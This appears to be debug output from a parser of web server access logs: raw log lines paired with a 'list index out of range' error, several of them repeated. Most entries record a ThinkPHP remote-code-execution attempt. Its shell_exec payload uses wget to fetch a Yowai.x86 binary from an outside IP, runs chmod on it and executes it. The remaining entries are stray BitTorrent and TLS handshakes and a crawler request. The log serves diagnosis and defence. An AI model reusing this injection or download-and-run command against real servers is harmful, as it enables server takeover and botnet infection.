('- - [22/Jan/2019:03:56:14 +0330] "GET /filter/27|13%20%D9%85%DA%AF%D8%A7%D9%BE%DB%8C%DA%A9%D8%B3%D9%84,27|%DA%A9%D9%85%D8%AA%D8%B1%20%D8%A7%D8%B2%205%20%D9%85%DA%AF%D8%A7%D9%BE%DB%8C%DA%A9%D8%B3%D9%84,p53 HTTP/1.1" 200 30577 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
